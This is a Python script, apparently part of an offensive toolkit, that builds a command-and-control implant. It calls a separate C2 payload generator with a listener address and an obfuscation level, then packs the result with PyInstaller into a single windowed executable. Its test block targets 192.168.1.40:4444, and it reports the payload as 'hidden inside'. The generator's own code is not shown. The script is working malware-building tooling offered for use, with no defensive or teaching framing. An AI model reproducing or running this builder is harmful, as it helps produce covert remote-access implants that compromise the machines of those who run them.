#!/usr/bin/env python3
"""
Simplified C2 Bundler - Works with complete C2 payload
"""

import os
import sys
import subprocess
import tempfile
from pathlib import Path


def create_bundled_payload(
    listener_ip, listener_port, obfuscation_level, platform="windows"
):
    """Crée un payload bundlé en une seule fonction"""

    try:
        # Import du générateur C2
        sys.path.insert(0, str(Path(__file__).parent))
        from c2_payload_complete import C2PayloadGenerator

        print(f"[*] Generating C2 payload...")
        print(f"[*] Listener: {listener_ip}:{listener_port}")
        print(f"[*] Obfuscation Level: {obfuscation_level}")

        # Générer le payload
        generator = C2PayloadGenerator(listener_ip, listener_port, obfuscation_level)
        payload_code = generator.generate()
        print(f"[+] Payload generated ({len(payload_code)} bytes)")

        # Créer un fichier temporaire
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(payload_code)
            temp_file = f.name

        print(f"[+] Temp file: {temp_file}")

        # Créer dossier dist
        dist_dir = Path.cwd() / "dist"
        dist_dir.mkdir(exist_ok=True)
        print(f"[+] Dist directory: {dist_dir}")

        print(f"[*] Running PyInstaller (this may take 30-60 seconds)...")

        # PyInstaller command
        output_name = "c2_payload"
        if platform == "windows":
            cmd = [
                sys.executable,
                "-m",
                "pyinstaller",
                "--onefile",
                "--windowed",
                "--distpath",
                str(dist_dir),
                "--specpath",
                str(dist_dir / "specs"),
                "--buildpath",
                str(dist_dir / "build"),
                "--name",
                output_name,
                temp_file,
            ]
        else:
            cmd = [
                sys.executable,
                "-m",
                "pyinstaller",
                "--onefile",
                "--distpath",
                str(dist_dir),
                "--specpath",
                str(dist_dir / "specs"),
                "--buildpath",
                str(dist_dir / "build"),
                "--name",
                output_name,
                temp_file,
            ]

        print(f"[*] Command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        # Show all output
        if result.stdout:
            print(f"[*] PyInstaller stdout:\n{result.stdout}")
        if result.stderr:
            print(f"[*] PyInstaller stderr:\n{result.stderr}")

        # Cleanup temp file
        try:
            os.unlink(temp_file)
        except:
            pass

        if result.returncode != 0:
            print(f"[!] PyInstaller failed with return code {result.returncode}")
            return False

        # Check executable
        if platform == "windows":
            exe_path = dist_dir / f"{output_name}.exe"
        else:
            exe_path = dist_dir / output_name

        if exe_path.exists():
            size_mb = exe_path.stat().st_size / 1024 / 1024
            print(f"[+] Executable created: {exe_path}")
            print(f"[+] Size: {size_mb:.2f} MB")
            print(f"[+] C2 payload hidden inside!")
            return True
        else:
            print(f"[!] Executable not found at {exe_path}")
            print(f"[!] Contents of dist: {list(dist_dir.iterdir())}")
            return False

    except subprocess.TimeoutExpired:
        print(f"[!] PyInstaller timeout (300s)")
        return False
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        import traceback
        print(traceback.format_exc())
        return False


if __name__ == "__main__":
    # Test
    success = create_bundled_payload("192.168.1.40", 4444, 2, "windows")
    sys.exit(0 if success else 1)
